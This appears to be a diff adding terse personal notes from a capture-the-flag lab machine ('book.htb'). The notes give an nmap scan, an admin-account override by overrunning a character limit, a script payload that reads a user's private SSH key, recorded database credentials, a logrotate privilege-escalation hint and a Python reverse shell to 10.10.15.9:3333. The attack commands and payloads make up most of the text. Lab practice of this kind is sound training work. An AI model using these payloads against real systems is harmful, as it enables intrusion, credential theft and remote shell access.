@@ -1,0 +1,62 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 11:06 EDT
+Nmap scan report for 10.10.10.176
+Host is up (0.055s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA)
+|   256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA)
+|_  256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: LIBRARY - Read | Learn | Have Fun
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+create admin@book.htb                          C
+^ go beyond char limit to override the admin account
+
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){
+document.write("tryin");
+document.write(this.responseText)
+};
+x.open("GET","file:///home/reader/.ssh/id_rsa");
+x.send();
+</script> 
+
+log in as reader
+
+book_admin
+I_Hate_Book_Reading
+book
+
+
+mysql -u book_admin -p
+--------------------+
+ Database           |
+--------------------+
+ information_schema |
+ book               |
+ mysql              |
+ performance_schema |
+ sys                |
+--------------------+
+
+mysql.user
+sys.user_summary
+sys.pet
+information_schema.USER_PRIVILEGES
+
+cp pspy
+
+ /usr/sbin/logrotate -f /root/log.cfg
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.9",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
